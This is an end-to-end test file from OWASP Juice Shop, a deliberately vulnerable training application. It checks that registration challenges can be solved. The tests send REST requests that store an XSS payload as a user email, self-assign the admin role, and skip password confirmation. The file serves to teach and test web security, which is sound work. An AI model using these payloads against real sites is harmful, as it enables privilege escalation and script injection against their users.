/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
import { browser, protractor } from 'protractor'
import { basePath, beforeEachLogin, expectChallengeSolved } from './e2eHelpers'

const models = require('../../models/index')
const utils = require('../../lib/utils')

describe('/#/register', () => {
  beforeEach(() => {
    void browser.get(`${basePath}/#/register`)
  })

  if (!utils.disableOnContainerEnv()) {
    describe('challenge "persistedXssUser"', () => {
      beforeEachLogin({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

      it('should be possible to bypass validation by directly using Rest API', async () => {
        void browser.executeScript((baseUrl: string) => {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 201) {
              console.log('Success')
            }
          }

          xhttp.open('POST', `${baseUrl}/api/Users/`, true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.send(JSON.stringify({
            email: '<iframe src="javascript:alert(`xss`)">',
            password: 'XSSed',
            passwordRepeat: 'XSSed',
            role: 'admin'
          }))
        }, browser.baseUrl)

        void browser.driver.sleep(5000)

        void browser.waitForAngularEnabled(false)
        const EC = protractor.ExpectedConditions
        void browser.get(`${basePath}/#/administration`)
        void browser.wait(EC.alertIsPresent(), 10000, "'xss' alert is not present on /#/administration")
        void browser.switchTo().alert().then(async alert => {
          await expectAsync(alert.getText()).toBeResolvedTo('xss')
          void alert.accept()
          // Disarm XSS payload so subsequent tests do not run into unexpected alert boxes
          models.User.findOne({ where: { email: '<iframe src="javascript:alert(`xss`)">' } }).then(user => {
            user.update({ email: '&lt;iframe src="javascript:alert(`xss`)"&gt;' }).catch(error => {
              console.log(error)
              fail()
            })
          }).catch(error => {
            console.log(error)
            fail()
          })
        })
        void browser.waitForAngularEnabled(true)
      })

      expectChallengeSolved({ challenge: 'Client-side XSS Protection' })
    })
  }

  describe('challenge "registerAdmin"', () => {
    it('should be possible to register admin user using REST API', () => {
      void browser.executeScript((baseUrl: string) => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 201) {
            console.log('Success')
          }
        }

        xhttp.open('POST', `${baseUrl}/api/Users/`, true)
        xhttp.setRequestHeader('Content-type', 'application/json')
        xhttp.send(JSON.stringify({ email: 'testing@test.com', password: 'pwned', passwordRepeat: 'pwned', role: 'admin' }))
      }, browser.baseUrl)
    })

    expectChallengeSolved({ challenge: 'Admin Registration' })
  })

  describe('challenge "passwordRepeat"', () => {
    it('should be possible to register user without repeating the password', () => {
      void browser.executeScript((baseUrl: string) => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 201) {
            console.log('Success')
          }
        }

        xhttp.open('POST', `${baseUrl}/api/Users/`, true)
        xhttp.setRequestHeader('Content-type', 'application/json')
        xhttp.send(JSON.stringify({ email: 'uncle@bob.com', password: 'ThereCanBeOnlyOne' }))
      }, browser.baseUrl)
    })

    expectChallengeSolved({ challenge: 'Repetitive Registration' })
  })
})
